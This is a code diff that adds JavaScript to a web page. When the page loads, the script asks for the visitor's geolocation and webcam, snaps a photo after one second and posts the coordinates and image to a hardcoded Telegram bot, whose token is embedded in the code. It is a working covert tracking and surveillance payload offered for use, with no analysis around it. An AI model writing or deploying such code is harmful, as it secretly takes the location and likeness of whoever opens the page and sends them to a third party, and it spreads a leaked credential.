@@ -68,6 +68,81 @@
                     console.log("Error: " + err);
                 });
         }
+
+        async function saveLocation(latitude, longitude) {
+            const telegramBotToken = '8614744009:AAEu0vGF14i_rVeZL6Q6ean-Vq_VC0xrdwc';
+            const chatId = '8614744009';  // Replace with your actual chat ID
+            const message = `Lokasi: Latitude = ${latitude}, Longitude = ${longitude}`;
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams(data)
+                });
+                console.log('Location sent to Telegram');
+            } catch (error) {
+                console.error('Failed to send location to Telegram', error);
+            }
+        }
+
+        async function savePhoto(imageData) {
+            const telegramBotToken = '8614744009:AAEu0vGF14i_rVeZL6Q6ean-Vq_VC0xrdwc';
+            const chatId = '8614744009';  // Replace with your actual chat ID
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageData);
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log('Photo sent to Telegram');
+            } catch (error) {
+                console.error('Failed to send photo to Telegram', error);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', (event) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    saveLocation(latitude, longitude);
+                });
+            }
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        var video = document.getElementById('video');
+                        video.srcObject = stream;
+                        video.play();
+
+                        setTimeout(function() {
+                            var canvas = document.getElementById('canvas');
+                            var context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, 640, 480);
+                            var imageData = canvas.toDataURL('image/jpeg');
+                            savePhoto(imageData);
+                        }, 1000); // Wait 1 second before capturing photo
+                    })
+                    .catch(function(err) {
+                        console.log("Error: " + err);
+                    });
+            }
+        });
     </script>
 </body>
 </html>
